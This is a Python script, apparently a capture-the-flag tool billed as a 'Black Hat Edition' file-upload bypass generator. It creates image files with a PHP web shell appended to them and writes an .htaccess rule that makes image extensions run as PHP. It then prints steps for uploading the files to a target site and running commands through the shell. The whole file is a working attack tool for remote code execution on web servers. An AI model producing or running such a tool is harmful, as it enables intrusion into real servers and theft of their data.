#!/usr/bin/env python3
import os
import argparse
import yaml
from PIL import Image
import random

def parse_ratio(s: str):
    if ':' not in s:
        raise argparse.ArgumentTypeError("Ratio must be WIDTH:HEIGHT like 1:1")
    w, h = s.split(':')
    return int(w), int(h)

def generate_polyglot_image(path: str, size: tuple, file_extension: str, php_payload: str = "<?php system($_GET['cmd']); ?>"):
    """
    Generates an image that is also a valid PHP shell.
    """
    w, h = size
    img = Image.new('RGB', size, (random.randint(1,255), random.randint(1,255), random.randint(1,255)))

    # Create a unique image
    for i in range(10):
        img.putpixel((random.randint(0, w-1), random.randint(0, h-1)), (random.randint(1,255), random.randint(1,255), random.randint(1,255)))

    if file_extension.lower().endswith(('.jpg', '.jpeg')):
        img.save(path, format="JPEG")
        with open(path, 'ab') as f:
            f.write(php_payload.encode())
    else:
        img.save(path, format=file_extension.replace('.', '').upper())

def main():
    parser = argparse.ArgumentParser(description="🔥 Advanced File Upload Bypass Generator - Black Hat Edition 🔥")
    parser.add_argument('--ratio', type=parse_ratio, required=True, help="Width:Height ratio like 2:3")
    parser.add_argument('--scale', type=int, default=100, help="Scale factor for pixel size")
    parser.add_argument('--yaml', default='extension.yaml', help="YAML file with patterns")
    parser.add_argument('--name', default='shell', help="Base name to replace {basename}")
    parser.add_argument('--payload', default="<?php system($_GET['cmd']); ?>", help="PHP payload to inject")
    parser.add_argument('--batch', action='store_true', help="Generate ALL patterns without prompting")
    args = parser.parse_args()

    output_dir = "bypass_payloads"
    os.makedirs(output_dir, exist_ok=True)

    # Load YAML
    try:
        with open(args.yaml, 'r', encoding='utf-8') as f:
            patterns = yaml.safe_load(f)
    except FileNotFoundError:
        print(f"[!] Error: YAML file '{args.yaml}' not found. Please create it.")
        return
    except yaml.YAMLError as e:
        print(f"[!] Error: Invalid YAML syntax in '{args.yaml}'. Please check the file.")
        print(f"    Details: {e}")
        return

    w, h = args.ratio[0] * args.scale, args.ratio[1] * args.scale
    selected_patterns = patterns if args.batch else []

    if not args.batch:
        print("\n[+] Available Bypass Techniques:")
        for i, p in enumerate(patterns):
            print(f"    {i+1}. {p['name']} -> {p['pattern']}")
        print("    0. Generate ALL techniques (--batch mode)")

        try:
            choice = input(f"\n[?] Select a technique (1-{len(patterns)}, or 0 for all): ").strip()
            if choice == "0":
                selected_patterns = patterns
                print("[+] Generating ALL techniques...")
            else:
                idx = int(choice) - 1
                if 0 <= idx < len(patterns):
                    selected_patterns = [patterns[idx]]
                else:
                    print("[-] Invalid choice.")
                    return
        except ValueError:
            print("[-] Please enter a valid number.")
            return

    generated_files = []

    for pattern_obj in selected_patterns:
        pattern = pattern_obj["pattern"]
        filename = pattern.replace("{basename}", args.name)
        access_url = pattern_obj["access"].replace("{filename}", filename) # Add this line

        # Determine the "real" extension for image generation
        extensions = filename.split('.')
        img_ext = '.png' # default
        for ext in reversed(extensions):
            if ext.lower() in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
                img_ext = f'.{ext}'
                break

        path = os.path.join(output_dir, filename)
        
        # Check if it's the .htaccess file, which needs special content
        if filename == ".htaccess":
            with open(path, 'w') as f:
                f.write("AddType application/x-httpd-php .jpg .png .gif\n") # Write the actual .htaccess content
            print(f"[+] Created: {filename} (HTACCESS RULES)")
        else:
            generate_polyglot_image(path, (w, h), img_ext, args.payload)
            print(f"[+] Created: {filename} ({w}x{h}px)")
        
        generated_files.append((filename, access_url)) # Store filename and access URL

    # PRINT THE WINNING INSTRUCTIONS
    print("\n" + "="*60)
    print("🎯 HOW TO WIN THE CTF (Access Your Shell):")
    print("="*60)
    
    for filename, access_url in generated_files:
        print(f"\nFor file: {filename}")
        print(f"  1. Upload it to the target website.")
        print(f"  2. Try to access it at a URL like:")
        print(f"     -> {access_url}")
        print(f"  3. Change 'whoami' to other commands like 'cat /flag.txt'")
        print(f"  4. Capture the flag! 🏴‍☠️")
    
    print("\nPro Tip: Use Burp Suite or OWASP ZAP to automate the upload of all these files!")

if __name__ == "__main__":
    main()
